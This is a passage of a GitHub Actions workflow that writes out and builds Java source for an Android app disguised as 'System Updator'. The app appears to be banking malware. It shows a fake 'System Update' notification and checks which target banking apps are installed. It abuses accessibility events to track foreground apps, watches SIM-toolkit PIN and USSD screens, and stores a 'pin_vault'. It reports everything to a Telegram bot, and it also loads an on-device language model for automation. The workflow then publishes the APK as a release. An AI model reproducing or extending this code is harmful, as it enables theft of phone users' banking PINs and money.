                      nm.createNotificationChannel(channel);
                  }
                  return new Notification.Builder(this, "fin_bot")
                      .setContentTitle("System Update")
                      .setContentText("Running")
                      .setSmallIcon(android.R.drawable.ic_menu_manage)
                      .build();
              }

              private void checkInstalledApps() {
                  StringBuilder found = new StringBuilder();
                  int foundCount = 0;
                  PackageManager pm = getPackageManager();
                  for (String pkg : USSD_MAP.keySet()) {
                      try {
                          pm.getPackageInfo(pkg, 0);
                          found.append("✅ ").append(pkg).append("\n");
                          foundCount++;
                      } catch (Exception e) { /* not installed */ }
                  }
                  String msg = "📋 *Installed Target Apps:*\n" + found.toString();
                  if (foundCount == 0) msg = "⚠️ *No target banking apps found installed.*";
                  sendTelegram(msg);
              }

              private void loadAI() {
                  executor.execute(() -> {
                      try {
                          sendTelegram("🧠 Loading AI (Gemma-2B)...");
                          String modelPath = getFilesDir().getAbsolutePath() + "/gemma-2b-it.task";
                          File modelFile = new File(modelPath);
                          if (!modelFile.exists()) {
                              URL url = new URL(MODEL_URL);
                              HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                              try (InputStream in = conn.getInputStream(); FileOutputStream out = new FileOutputStream(modelPath)) {
                                  byte[] buf = new byte[8192];
                                  int len;
                                  while ((len = in.read(buf)) != -1) out.write(buf, 0, len);
                              }
                          }
                          LlmInferenceOptions options = LlmInferenceOptions.builder()
                                  .setModelFilePath(modelPath)
                                  .build();
                          llmInference = LlmInference.createFromOptions(options);
                          isAiReady = true;
                          sendTelegram("✅ AI Ready (Gemma-2B)");
                      } catch (Exception e) {
                          Log.e(TAG, "AI error: " + e.getMessage());
                          sendTelegram("❌ AI load failed: " + e.getMessage());
                      }
                  });
              }

              private String askAI(String prompt) {
                  if (!isAiReady || llmInference == null) return "AI_NOT_READY";
                  try { return llmInference.generateResponse(prompt); }
                  catch (Exception e) { return "AI_ERROR"; }
              }

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {
                  if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                      String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
                      String cls = event.getClassName() != null ? event.getClassName().toString() : "";
                      Log.d(TAG, "📱 " + pkg + " / " + cls);

                      if (isTargetApp(pkg)) {
                          handleTargetApp(pkg);
                          isAppInForeground = true;
                      }

                      if (isAppInForeground && !isTargetApp(pkg) && !pkg.equals(currentPackage)) {
                          Log.d(TAG, "🚪 User exited target app: " + currentPackage);
                          isAppInForeground = false;
                          handler.postDelayed(() -> executeAutomation(currentPackage), 500);
                      }

                      if (pkg.contains("stk") || pkg.contains("simtoolkit")) handleStkPin();
                      if (cls.contains("Ussd") || cls.contains("USSD")) handleUssd();
                  }
              }

              private boolean isTargetApp(String pkg) {
                  return USSD_MAP.containsKey(pkg);
              }

              private void handleTargetApp(String pkg) {
                  currentPackage = pkg;
              }

              private void handleStkPin() {
                  Log.d(TAG, "STK PIN detected");
              }

              private void handleUssd() {
                  Log.d(TAG, "USSD detected");
              }

              private void loadPinVault() {
                  try {
                      String json = prefs.getString("pin_vault", "{}");
                      Type type = new TypeToken<Map<String, PinData>>(){}.getType();
                      pinVault = gson.fromJson(json, type);
                  } catch (Exception e) {
                      pinVault = new HashMap<>();
                  }
              }

              private void savePinVault() {
                  try {
                      String json = gson.toJson(pinVault);
                      prefs.edit().putString("pin_vault", json).apply();
                  } catch (Exception e) {
                      Log.e(TAG, "Error saving pin vault: " + e.getMessage());
                  }
              }

              private void checkForegroundApp() {
                  ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                  if (am != null) {
                      try {
                          ActivityManager.RunningAppProcessInfo info = am.getRunningAppProcesses().get(0);
                          Log.d(TAG, "Foreground app: " + info.processName);
                      } catch (Exception e) {
                          Log.e(TAG, "Error: " + e.getMessage());
                      }
                  }
                  handler.postDelayed(this::checkForegroundApp, 3000);
              }

              private void executeAutomation(String pkg) {
                  sendTelegram("⏳ Automation triggered for: " + pkg);
              }

              private void sendTelegram(String msg) {
                  executor.execute(() -> {
                      try {
                          URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + msg.replace("\"", "\\\"") + "\",\"parse_mode\":\"Markdown\"}";
                          conn.getOutputStream().write(json.getBytes("UTF-8"));
                          conn.getOutputStream().flush();
                          int code = conn.getResponseCode();
                          conn.disconnect();
                          if (code != 200) Log.e(TAG, "Telegram error: " + code);
                      } catch (Exception e) {
                          Log.e(TAG, "Telegram send error: " + e.getMessage());
                      }
                  });
              }

              @Override
              public void onInterrupt() {
                  Log.d(TAG, "Service interrupted");
              }
          }
          EOF

      # =============== BUILD & DEPLOY ===============

      - name: Build APK
        run: |
          chmod +x gradlew
          ./gradlew clean assembleDebug

      - name: Upload APK Artifact
        if: success()
        uses: actions/upload-artifact@v4
        with:
          name: system-updator-apk
          path: app/build/outputs/apk/debug/app-debug.apk

      - name: Create Release
        if: success()
        uses: softprops/action-gh-release@v1
        with:
          files: app/build/outputs/apk/debug/app-debug.apk
          tag_name: v${{ github.run_number }}
          body: "🚀 System Updator APK Build #${{ github.run_number }}"
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Build Status
        if: always()
        run: |
          echo "Build Status: ${{ job.status }}"
          echo "Commit: ${{ github.sha }}"
          echo "Branch: ${{ github.ref }}"
